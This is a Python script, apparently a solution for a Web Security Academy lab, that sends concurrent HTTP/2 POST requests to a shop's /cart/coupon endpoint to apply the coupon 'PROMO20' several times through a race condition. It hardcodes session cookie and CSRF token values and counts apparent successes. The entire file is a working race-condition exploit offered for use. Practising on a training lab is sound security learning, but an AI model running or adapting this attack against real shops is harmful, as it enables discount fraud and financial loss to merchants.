import asyncio
import httpx
import time

# CONFIGURABLE - USE YOUR CURRENT VALUES
hostid = '0a99000b034d1e9c83117d7e006100d0'
cookies_session = 'gkPkvG4hppMAxrKAMADlUr8f8PpBjyuV'
csrftoken = 'YSEgDrGqlm7IYUSOb5nOV494wnyRYG5x'
payload = 'PROMO20'

bpc = 5
nc = 5

async def blast(client, url, headers, data, task_id, success_counter):
    for i in range(bpc):
        try:
            start = time.time()
            response = await client.post(url, headers=headers, data=data)
            end = time.time()
            
            if "Coupon already applied" in response.text:
                result = "DUPLICATE"
            elif "apply coupon" in response.text or (response.status_code == 200 and len(response.text) == 7171):
                result = "SUCCESS?"
                success_counter[0] += 1
            else:
                result = f"UNKNOWN: {response.status_code}"
            
            print(f"[{task_id:02d}-{i:02d}] {result} | Time: {(end-start):.3f}s | Len: {len(response.text)}")
        except Exception as e:
            print(f"[{task_id:02d}-{i:02d}] ERROR: {str(e)}")

async def main():
    url = f"https://{hostid}.web-security-academy.net/cart/coupon"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded", 
        "Cookie": f"session={cookies_session}"
    }
    data = f"csrf={csrftoken}&coupon={payload}"
    
    success_counter = [0]
    
    print(f"[*] Starting HTTP/2 race condition attack")
    print(f"[*] Target: {hostid}")
    print(f"[*] Configuration: {nc} connections × {bpc} requests each")
    print("-" * 60)
    
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [blast(client, url, headers, data, i, success_counter) for i in range(nc)]
        await asyncio.gather(*tasks)
    
    print("-" * 60)
    print(f"[*] SUCCESS? responses: {success_counter[0]}")

if __name__ == "__main__":
    asyncio.run(main())
